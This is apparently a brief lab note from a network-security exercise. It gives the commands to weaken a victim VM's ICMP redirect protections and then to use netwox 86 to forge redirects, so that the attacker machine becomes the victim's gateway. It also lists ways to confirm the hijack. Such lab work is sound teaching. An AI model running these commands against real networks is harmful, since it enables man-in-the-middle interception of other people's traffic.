First, Do this on the victim machine : 
sudo sysctl -w net.ipv4.conf.all.secure_redirects=0
sudo sysctl -w net.ipv4.conf.default.secure_redirects=0
sudo sysctl -w net.ipv4.conf.enp0s8.secure_redirects=0
sudo sysctl -w net.ipv4.conf.lo.secure_redirects=0

these should be 1 on attacker machine.

From Attacker Terminal, Run (attacker and vms must be on same network):


netwox 86 --device "Eth0" --filter "src host VICTIMIP" --gw VICTIM_REDIRECTED_GATEWAY_ATTACKERS_IP --code 1 --src-ip ACTUAL_GATEWAY_OF_VICTIM

netwox 86 --device "Eth0" --filter "src host VICTIMIP" --gw VICTIM_REDIRECTED_GATEWAY_ATTACKERS_IP --code 1 --src-ip ACTUAL_GATEWAY_OF_VICTIM


â€“ Here VM1(192.168.181.141) use Netwox 86 to attack
the route table of VM2(192.168.181.142) and
associates itself as a new gateway using the original default
gateway(192.168.181.2)


after this, the attacker machine will act as the gateway for the victim machine. and
not the victims actual gateway.

to verify. we can ping OR run wireshark, or traceroute or route and see route from

victim ip to dns

it should have destination ip of attacker machine.
